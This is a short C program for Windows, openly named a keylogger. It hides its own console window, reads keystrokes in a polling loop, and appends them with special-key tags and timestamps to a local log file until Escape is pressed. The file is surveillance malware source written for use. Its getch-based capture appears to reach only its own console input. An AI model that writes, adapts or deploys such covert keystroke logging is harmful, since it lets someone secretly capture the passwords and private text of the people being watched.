#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <stdbool.h>
#include <time.h>
#include <windows.h>

#define LOG_FILE_PATH "keylogger.log"
#define WINDOW_CLASS "ConsoleWindowClass"
#define SLEEP_TIME 20 // In milliseconds
#define ESCAPE_KEY 27

void hideConsoleWindow(void) {
    HWND window = FindWindowA(WINDOW_CLASS, NULL);
    if (window) {
        ShowWindow(window, 0);
        AllocConsole();
    }
}

void logToFile(char c, FILE *file) {
    switch (c) {
        case ' ':
            fprintf(file, " ");
            break;
        case '\t':
            fprintf(file, "[TAB]");
            break;
        case '\r':
            fprintf(file, "[ENTER]");
            break;
        case '\x1B':
            fprintf(file, "[ESC]");
            break;
        case '\b':
            fprintf(file, "[BACKSPACE]");
            break;
        default:
            fputc(c, file);
            break;
    }
}

bool startLogging(FILE **file) {
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    *file = fopen(LOG_FILE_PATH, "a+");
    if (*file == NULL) {
        fprintf(stderr, "Error opening file '%s'.\n", LOG_FILE_PATH);
        return false;
    }
    fprintf(*file, "\n#$Logger: Started logging @ %s", asctime(timeinfo));
    return true;
}

bool stopLogging(FILE *file) {
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    fprintf(file, "\n#$Logger: Stopped logging @ %s", asctime(timeinfo));
    return fclose(file) == 0;
}

int main() {
    char c;
    FILE *file = NULL;

    hideConsoleWindow();

    if (!startLogging(&file)) {
        return EXIT_FAILURE;
    }

    while (true) {
        Sleep(SLEEP_TIME);
        if (kbhit()) {
            c = getch();
            logToFile(c, file);
            if (c == ESCAPE_KEY) {
                if (stopLogging(file)) {
                    ShowWindow(FindWindowA(WINDOW_CLASS, NULL), 1);
                    return EXIT_SUCCESS;
                } else {
                    fprintf(stderr, "Error stopping logging.\n");
                    return EXIT_FAILURE;
                }
            }
        }
    }
}
